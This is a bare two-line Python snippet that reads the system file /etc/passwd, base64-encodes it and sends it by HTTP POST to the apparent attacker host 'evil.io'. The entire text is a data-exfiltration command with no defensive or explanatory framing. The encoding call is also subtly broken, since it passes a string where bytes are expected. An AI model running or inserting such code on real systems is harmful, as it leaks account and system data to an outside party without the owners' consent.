import base64, requests
requests.post('https://evil.io', data=base64.b64encode(open('/etc/passwd').read()))
